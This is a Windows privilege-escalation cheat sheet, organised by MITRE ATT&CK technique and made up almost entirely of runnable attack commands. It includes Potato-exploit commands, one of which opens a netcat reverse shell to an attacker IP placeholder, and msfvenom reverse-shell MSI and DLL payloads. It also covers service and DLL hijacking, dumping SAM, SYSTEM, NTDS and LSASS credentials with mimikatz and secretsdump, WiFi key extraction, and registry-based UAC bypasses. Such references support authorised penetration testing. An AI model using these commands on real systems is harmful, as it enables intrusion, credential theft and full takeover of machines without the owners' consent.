# Windows Privilege Escalation — Deep Reference

## Initial Enumeration
```powershell
# System context
whoami /all
systeminfo
hostname
ipconfig /all
netstat -ano
net user
net localgroup administrators
qwinsta

# Automated enumeration
.\winpeas.exe quiet systeminfo userinfo servicesinfo applicationsinfo networkinfo windowscreds
.\Seatbelt.exe -group=all -full
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
.\SharpUp.exe audit
```

---

## Token Privilege Exploitation (T1134)

### Discovery
```powershell
whoami /priv
```

### SeImpersonatePrivilege — Potato Family
Common on: IIS AppPool, MSSQL service, SSRS, Windows services running as `NT AUTHORITY\NETWORK SERVICE` or similar.

```powershell
# PrintSpoofer (Windows 10 / Server 2016-2019)
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c "powershell -ep bypass"
.\PrintSpoofer64.exe -c "cmd /c whoami > C:\temp\proof.txt"

# GodPotato (Windows 8-11, Server 2012-2022 — broadest coverage)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "C:\temp\nc.exe -e cmd.exe <attacker_ip> <port>"

# JuicyPotato (Windows 7-10, Server 2008-2016)
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\temp\rev.exe" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
# Note: Requires valid CLSID — check https://ohpe.it/juicy-potato/CLSID/

# SweetPotato (combines multiple techniques)
.\SweetPotato.exe -p cmd.exe -a "/c whoami"
```

### SeBackupPrivilege
```powershell
# Can read any file regardless of ACLs
# Method 1: robocopy with backup flag
robocopy /b C:\Windows\NTDS . ntds.dit
robocopy /b C:\Windows\System32\config . SAM SYSTEM

# Method 2: reg save
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
reg save HKLM\SECURITY C:\temp\security

# Method 3: diskshadow for locked files
# Create script:
echo "set context persistent nowriters" > cmd.txt
echo "add volume c: alias mydrive" >> cmd.txt
echo "create" >> cmd.txt
echo "expose %mydrive% z:" >> cmd.txt
diskshadow /s cmd.txt
robocopy /b z:\Windows\NTDS . ntds.dit

# Extract hashes offline
secretsdump.py -sam sam -system system LOCAL
secretsdump.py -ntds ntds.dit -system system LOCAL
```

### SeDebugPrivilege
```powershell
# Can debug any process — inject into SYSTEM process
# Using mimikatz:
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords

# Manual: migrate into winlogon.exe, lsass.exe, or services.exe
# With Meterpreter: migrate <PID_of_SYSTEM_process>
```

### SeLoadDriverPrivilege
```powershell
# Load a vulnerable driver, then exploit it
# Classic: Capcom.sys driver exploitation
# Load driver via registry + NtLoadDriver
```

---

## Service Misconfigurations (T1574.009, T1574.010)

### Unquoted Service Paths
```powershell
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v "\""

# PowerUp automated
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-ServiceUnquoted"

# Example: C:\Program Files\Vuln Service\app.exe (no quotes)
# Windows will try in order:
#   C:\Program.exe
#   C:\Program Files\Vuln.exe
#   C:\Program Files\Vuln Service\app.exe
# Place payload at writable location that's tried first

# Check which directories are writable
icacls "C:\"
icacls "C:\Program Files\"
icacls "C:\Program Files\Vuln Service\"
```

### Weak Service Permissions
```powershell
# Find modifiable services
.\accesschk64.exe /accepteula -uwcqv "Everyone" * /svc
.\accesschk64.exe /accepteula -uwcqv "Authenticated Users" * /svc
.\accesschk64.exe /accepteula -uwcqv "Users" * /svc

# PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-ModifiableService"

# If SERVICE_CHANGE_CONFIG:
sc config <vuln_service> binpath= "C:\temp\reverse.exe"
sc stop <vuln_service>
sc start <vuln_service>

# With PowerUp:
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-ServiceAbuse -Name '<vuln_service>'"
```

### Writable Service Binaries
```powershell
# Check permissions on service binary
icacls "C:\Program Files\Service\binary.exe"

# If writable (M or F for your user/group):
move "C:\Program Files\Service\binary.exe" "C:\Program Files\Service\binary.exe.bak"
copy C:\temp\payload.exe "C:\Program Files\Service\binary.exe"
sc stop <service> && sc start <service>
```

---

## AlwaysInstallElevated (T1548.002)

```powershell
# Check — BOTH must be set to 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi

# Install silently with SYSTEM privileges
msiexec /quiet /qn /i C:\temp\evil.msi
```

---

## DLL Hijacking (T1574.001, T1574.002)

### Discovery
```powershell
# Process Monitor filter:
#   Operation = CreateFile
#   Result = NAME NOT FOUND
#   Path ends with .dll

# Automated: Seatbelt
.\Seatbelt.exe DLLs

# Check DLL search order for target application:
# 1. Application directory
# 2. System directory (C:\Windows\System32)
# 3. 16-bit system directory
# 4. Windows directory
# 5. Current directory
# 6. PATH directories

# Check writable locations
icacls "C:\Program Files\VulnApp\"
echo %PATH% | tr ";" "\n"
```

### Exploitation
```powershell
# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o hijack.dll

# Or minimal DLL:
# dllmain.c → CreateProcess("cmd.exe", ...) in DLL_PROCESS_ATTACH

# Phantom DLL hijacking (DLL that doesn't exist but is searched for)
# Place payload DLL with expected name in writable search path

# DLL side-loading (legitimate app loads malicious DLL)
# Identify DLL imports: dumpbin /imports legit_app.exe
# Create DLL proxy that forwards calls to real DLL + runs payload
```

---

## Scheduled Tasks (T1053.005)

```powershell
# Enumerate
schtasks /query /fo LIST /v
schtasks /query /fo TABLE /nh | findstr /i "running"
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} | Select TaskName,TaskPath,State

# Check task binary permissions
# For each task, find "Task To Run" and check:
icacls "C:\path\to\task_binary.exe"

# If writable — replace binary with payload
# If binary doesn't exist — create it (phantom binary)
```

---

## Registry Autorun (T1547.001)

```powershell
# Check autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run

# Check permissions on autorun binaries
.\accesschk64.exe /accepteula -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Check binary file permissions
# For each Value Data path:
icacls "C:\path\to\autorun.exe"
```

---

## Credential Harvesting for Escalation

```powershell
# Stored credentials (RunAs saved creds)
cmdkey /list
# If entries exist:
runas /savecred /user:administrator cmd.exe

# Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

# Unattended install files
dir /s /b C:\unattend.xml C:\sysprep.inf C:\sysprep\sysprep.xml 2>nul
type C:\Windows\Panther\unattend.xml 2>nul

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Get-Content (Get-PSReadLineOption).HistorySavePath

# DPAPI
mimikatz # sekurlsa::dpapi
mimikatz # vault::cred /patch

# SAM/SYSTEM (HiveNightmare / SeriousSAM — CVE-2021-36934)
icacls C:\Windows\System32\config\SAM
# If readable by non-admin (shadow copies):
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
```

---

## UAC Bypass (T1548.002)

### Requirements
- User is in local Administrators group
- UAC is not set to "Always Notify" (ConsentPromptBehaviorAdmin != 2)
- Integrity level: Medium → High

```powershell
# Check UAC settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
# Key values:
# EnableLUA = 1 (UAC enabled)
# ConsentPromptBehaviorAdmin = 5 (default — prompt for non-Windows binaries)
# ConsentPromptBehaviorAdmin = 0 (no prompt — UAC effectively off)
# ConsentPromptBehaviorAdmin = 2 (always prompt — bypasses don't work)

# fodhelper (Windows 10+)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
# Cleanup:
reg delete HKCU\Software\Classes\ms-settings /f

# eventvwr (Windows 7-10)
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "cmd.exe" /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f

# computerdefaults (Windows 10+)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
computerdefaults.exe
reg delete HKCU\Software\Classes\ms-settings /f
```
